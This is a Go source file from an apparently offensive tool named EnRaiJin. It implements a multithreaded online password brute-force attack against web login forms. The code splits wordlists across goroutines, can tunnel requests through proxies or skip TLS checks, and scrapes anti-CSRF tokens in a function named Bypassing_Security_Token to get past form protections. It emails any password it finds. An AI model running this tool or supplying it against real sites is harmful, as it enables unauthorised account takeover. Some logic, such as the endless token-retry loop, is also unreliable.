package bruteforce

import (
	"bufio"
	"bytes"
	"crypto/tls"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"net/http"
	"net/http/cookiejar"
	"net/url"
	"os"
	"regexp"
	"runtime"
	"strings"
	"sync"
	"time"
	
	"EnRaiJin/pkg/config"
	"EnRaiJin/pkg/middleware"
	"EnRaiJin/pkg/mail"
	"EnRaiJin/pkg/headers"
	proxy "EnRaiJin/pkg/proxy/v2"
	"EnRaiJin/pkg/site"
	"EnRaiJin/pkg/structs"
)

var (
	Types_Available []string 	= []string{"list", "file", "stdin"}

	Field 	string 				= config.YAMLConfig.B.Field
	From  	string 				= config.YAMLConfig.B.From
	File	string				= config.YAMLConfig.B.File
	List	[]string			= config.YAMLConfig.B.List
	Fail	structs.YAMLOn_fail = config.YAMLConfig.OF
	Pass	structs.YAMLOn_pass = config.YAMLConfig.OP
	Threads int					= config.YAMLConfig.B.Threads
	NoVerbose bool				= config.YAMLConfig.B.NoVerbose
	Output	string				= config.YAMLConfig.B.Output

	// status_code for on_fail and on_pass
	OFStatusCode int			= config.YAMLConfig.OF.StatusCode
	OPStatusCode int			= config.YAMLConfig.OP.StatusCode

	IgnoreTLS bool				= config.YAMLConfig.S.IgnoreTLS

	// debug will show the response body of the request
	Debug 	  bool				= config.YAMLConfig.B.Debug

	// Crawl
	Crawl_Search string 		= config.YAMLConfig.C.Search
	Crawl_Url	 string 		= config.YAMLConfig.C.Url
	Crawl_Name	 string 		= config.YAMLConfig.C.Name

	// some status messages
	StatusFinished string 		= "finished"
	StatusFound	string 			= "found"

	Attack Attack_Result

	Start_Time time.Time

	// adding some error messages
	ErrNoPasswords 				= errors.New("there is no passwords available for bruteforce, please specify some passwords")
	ErrOpeningWordlist 			= errors.New("we have issues with opening a wordlist file, make sure that file exists and is readable")
	ErrWrongType   				= errors.New("you specified the wrong source of dictionary, allowed types are (file, list)")
	ErrEmptyField  				= errors.New("the field that you want to bruteforce is empty")
	ErrTooMuchThreads			= errors.New("too much threads for such small wordlist, please decrease amount of threads") 
	ErrUnixRequired     		= errors.New("you can not use this feature on Windows, you can use WSL instead")
	ErrMissingGroup				= errors.New("you forget to add group to the crawl/search option")
	ErrNoCrawlName				= errors.New("you forget to add the name of the field for token, without that option we can't set the token")
	ErrThreadsLessZero			= errors.New("threads can't be less than zero, zero threads default value is 5")
)

type Attack_Result struct {
	Status		string
	Password	string
	Stop 		bool
	ErrorMessage string
}

type Attack_Fail struct {
	Password string
	Try_count int
}

var AttackFail Attack_Fail

// verifying if the list type is correct, currently there is only two types available - file and list
func verify_type() bool{
	for _, t := range Types_Available {
		if From == t {
			return true
		}
	}
	return false
}

// Loading dictionary from file or from the list that is defined in the config file
func Dictionary() ([][]string, error) {
	var wordlist []string
	// Verifying that the source of the dictionary is allowed
	if ok := verify_type(); !ok {
		return nil, ErrWrongType
	}
	switch(From){
		case "list":
			wordlist = List
		case "file":
			contents, err := os.ReadFile(File)
			if err != nil {
				return nil, ErrOpeningWordlist
			}
			wordlist = strings.Split(string(contents), "\n")
	}
	// Checking if the last element of the list is not empty
	// If the last element is empty, then we are deleting it 
	{
		if len(wordlist) != 0 {
			if len(wordlist[len(wordlist)-1]) == 0 {
				wordlist = wordlist[:len(wordlist)-1]
			}
		}
	}
	// When we cleared empty line at the end, let's check if the list is not empty now
	if len(wordlist) == 0 {
		return nil, ErrNoPasswords
	}
	
	// spliting the wordlist for eaxh thread
	// To split a wordlist we need to know how much threads we want to use, if threads are not set, we will set them to default one
	if Threads == 0 {
		Threads = 5
	}
	// checking if the threads is not less than 0
	if Threads < 0 {
		return nil, ErrThreadsLessZero
	}

	// calculating the length how much passwords will be in one thread
	var size int = len(wordlist) / Threads
	// creating the output slice
	var result = make([][]string, 0)
	// checking if the size is not less than 1, because too much threads can cause that
	if size < 1 {
		return nil, ErrTooMuchThreads
	}
	// the brain of spliting
	for i := 0; i < len(wordlist); i += size{
		end := i + size
		// for the last element
		if end > len(wordlist) {
			end = len(wordlist)
		}
		slice := wordlist[i:end]
		// this code moves passwords from one thread to another if there are too less passwords
		if len(slice) != size {
			// we need to get the last element
			last_slice := result[len(result)-1]
			// calculating the location of the last element
			index := len(result) - 1
			// deleting the last element
			result = append(result[:index], result[index+1:]...)
			// adding passwords to previous thread and adding back to result
			result = append(result, append(last_slice, slice...))
		} else {
			result = append(result, slice)
		}
	}
	// again checking if threads are not so much
	// length of the result slice need to match the count of threads
	if len(result) != Threads {
		return nil, ErrTooMuchThreads
	}
	return result, nil
}

// The function where all the magic happens
func Start() error {
	// starting the timer
	Start_Time = time.Now()
	// printing a message that no-verbose mode is enabled.
	if NoVerbose {
		fmt.Printf("\033[34m[~] Starting brute-force attack in no-verbose mode...\033[0m\n")
	}

	// printing a message that requests are proxied.
	if proxy.IsProxy() {
		fmt.Printf("\033[34m[~] Requests are tunneled through the proxy\033[0m\n")
	}

	// printing a message that debugging is enabled.
	if Debug {
		fmt.Printf("\033[34m[~] Debug: Enabled\033[0m\n")
	}

	// setting the default on_pass status code
	if OPStatusCode == 0 {
		OPStatusCode = http.StatusOK
	}
	if From == "stdin" {
		if runtime.GOOS == "windows" {
			return ErrUnixRequired
		}
		file, err := os.Open("/dev/stdin")
		if err != nil {
			fmt.Printf("error: %v\n", err)
		}
		defer file.Close()

		scanner := bufio.NewScanner(file)
		for scanner.Scan() {
			err := _run_attack(scanner.Text())
			if err != nil {
				fmt.Printf("error: %v\n", err)
			}
		}
	} else {
		if Debug {
			fmt.Println("Reading wordlist...")
		}
		// loading wordlist
		wordlist, err := Dictionary()
		if err != nil {
			return err
		}
		// making sure that user specified the field that he wants to bruteforce
		if len(Field) == 0 {
			return ErrEmptyField
		}
		var wg sync.WaitGroup
		// adding +1 job
		wg.Add(len(wordlist))
		// starting reading the wordlist
		if Debug {
			fmt.Println("Launching attack")
		}
		for _, w := range wordlist {
			// adding goroutine to run each thread in sync
			go func(w []string) {
				// finishing the job
				defer wg.Done()
				// finally reading the passwords
				for _, pass := range w {
					// launching attacks for next steps
					err := _run_attack(pass)
					if err != nil {
						fmt.Printf("error: %v\n", err)
					}
					// TODO: Handle error message from the attack function
					if Attack.Stop {
						// deleting the wordlist to stop the threads
						wordlist = [][]string{}
						return
					}
				}
			}(w)
		}
		wg.Wait()
	}
	// When the script stopped working, this will be printed out
	err := _attack_finished()
	if err != nil {
		return err
	}
	return nil
}

// launching the thread brute-force attack
func _run_attack(pass string) error {
	if !Attack.Stop {
		client := &http.Client{
			Timeout: 15 * time.Second,
		}
		jar, err := cookiejar.New(nil)
		if err != nil {
			return err
		}
		client.Jar = jar

		// Applying proxy tunnel to the request
		if proxy.IsProxy() {
			proxy.Apply(client)
		} else if IgnoreTLS {
			client.Transport = &http.Transport{TLSClientConfig: &tls.Config{InsecureSkipVerify: true}}
		}

		// adding a data to the request
		var data io.Reader
		if headers.Find("Content-Type") == "application/json" {
			d := make(map[string]interface{})
			for _, field := range site.Fields {
				d[field.Name] = field.Value
			}
			if Crawl_Search != "" {
				token := Find_Token(client)
				d[Crawl_Name] = token
			}
			d[Field] = pass
			a, err := json.Marshal(d)
			if err != nil {
			  return err
			}
			data = bytes.NewReader(a)
		} else {
			values := url.Values{}
			// checking if the token pattern is added
			if Crawl_Search != "" {
				token := Find_Token(client)
				values.Set(Crawl_Name, token)
			} 
			for _, field := range site.Fields {
				values.Set(field.Name, field.Value)
			}
			values.Set(Field, pass)
			data = strings.NewReader(values.Encode())
		}

		// adding a slash to the host if there is no slash
		if site.Host[len(site.Host)-1] != 47 {
			site.Host = site.Host + "/"
		}

		req, err := http.NewRequest(site.Method, site.Host, data)
		if err != nil {
			return err
		}
		defer req.Body.Close()

		if headers.Is() {
			for _, header := range headers.Get(){
				req.Header.Set(header.Name, header.Value)
			}
		}

		middleware := middleware.Middleware {
			Client: client,
			Request: req,
		}
		err = middleware.Do()
		if err != nil {
			Attack = Attack_Result {Status: StatusFinished, Stop: true, ErrorMessage: err.Error()}
			return nil
		}

		if Debug {
			fmt.Printf("Request_RAW: %v\n", req)
		}

		resp, err := client.Do(req)
		if err != nil {
			// if there was any error, repeating the same request again until it's successful.
			AttackFail.Password = pass
			AttackFail.Try_count++

			if Debug {
				fmt.Printf("Request was unsuccessful, repeating...%d\n", AttackFail.Try_count)
			}

			if AttackFail.Try_count == 10 {
				password_try, _ := json.Marshal(AttackFail)
                Attack = Attack_Result {Status: StatusFinished, Stop: true, ErrorMessage: fmt.Sprintf("Something went wrong / \n\t%s / \n\tPassword try: %q", err, string(password_try))}
				return nil
			}

			_run_attack(pass)
		}
		// Resetting fail count in case it recovered and moved to other passwords.
		AttackFail = Attack_Fail{}

		if resp == nil {
			return nil
		}
		defer resp.Body.Close()
		
		if Debug {
			fmt.Println(resp)
		}
		// if server says that page doesn't exists then we are stopping the script.
		// TODO: that would be a good idea to add an ignore option for this.
		if resp.StatusCode == http.StatusNotFound{
			if Debug {
				body, err := io.ReadAll(resp.Body)
				if err != nil {
					return err
				}
				fmt.Println(string(body))
			}
			Attack = Attack_Result {Status: StatusFinished, Stop: true, ErrorMessage: "The server says 404"}
			return nil
		} else {
			body, err := io.ReadAll(resp.Body)
			if err != nil {
				return err
			}
			if Debug {
				fmt.Println(string(body))
				fmt.Println(resp.StatusCode)
			}
			// some tests on status codes
			if resp.StatusCode != OFStatusCode && resp.StatusCode == OPStatusCode {
				if ((len(Fail.Message) != 0 && !strings.Contains(string(body), Fail.Message)) && (len(Pass.Message) == 0) || (len(Pass.Message) != 0 && strings.Contains(string(body), Pass.Message))) {
					Attack = Attack_Result {Status: StatusFound, Password: pass, Stop: true}
					return nil
				}
			}
			_while_running(pass)
		}
	}
	return nil
}

// message that will be printed while the script is running
func _while_running(pass string){
	if !NoVerbose {
		fmt.Printf("\033[34m[~] trying password: %v\033[0m\n", pass)
	}
}

// message that will be printed out when the script is finished
func _attack_finished() (err error){
	// checking if the attack is stopped and the password is found
	if Attack.Stop && Attack.Status == StatusFound  && Attack.Password != "" {
		started := Start_Time.Format("2006-01-02 15:04:05")
		fmt.Printf("\033[32m[~] the thing that you were looking for is found: %v\033[0m\n", Attack.Password)
		fmt.Printf("\033[32m[~] elapsed time: %v, started %v\033[0m\n", time.Since(Start_Time), started)
		// there we will save the password
		WritePasswordToFile()
		// sending an email if enabled
		mail.Set_Password(Attack.Password)
		err = mail.Send()
		if err != nil {
			return err
		}
		return
	}
	fmt.Printf("\033[33m[~] Well, looks that we can't find a thing that you need, sorry. :/\033[0m\n")
	if len(Attack.ErrorMessage) != 0 {
		fmt.Printf("\033[33m[~] Error: %s\033[0m\n", Attack.ErrorMessage)
		return
	}
	return
}

// Saving the password in the file
func WritePasswordToFile(){
	// checking if the "output" option is added
	if len(Output) != 0 {
		// writting password to the file
		os.WriteFile(Output, []byte(Attack.Password), 0644)
	}
}

// Crawling out the token
func Bypassing_Security_Token(client *http.Client) (string, error) {
	var Token_Uri string
	if len(Crawl_Url) != 0 {
		Token_Uri = Crawl_Url
	} else {
		Token_Uri = site.Host
	}

	req, err := http.NewRequest(http.MethodGet, Token_Uri, nil)
	if err != nil {
		return "", err
	}
	// defer req.Body.Close()
	if headers.Is() {
		for _, header := range headers.Get(){
			req.Header.Set(header.Name, header.Value)
		}
	}
	resp, err := client.Do(req)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()
	if resp.StatusCode == http.StatusOK {
		body, err := io.ReadAll(resp.Body)
		if err != nil {
			return "", err
		}
		re := regexp.MustCompile(Crawl_Search)

		if len(re.FindSubmatch(body)) != 2 {
			return "", ErrMissingGroup
		}
		return string(re.FindSubmatch(body)[1]), nil
	}
	return "", nil
}

// finding the token
func Find_Token(client *http.Client) (token string) {
	var err error
	// finding the token
	try_again:
		token, err = Bypassing_Security_Token(client)
		if err != nil {
			// if the request failed to get the token, repeating the request again until it's successful.
			goto try_again
		}
	// Checking if the Crawl_Name is added because it's a very important option
	if len(Crawl_Name) == 0 {
		Attack = Attack_Result {Status: StatusFinished, Stop: true, ErrorMessage: err.Error()}
		return ""
	}
	return
}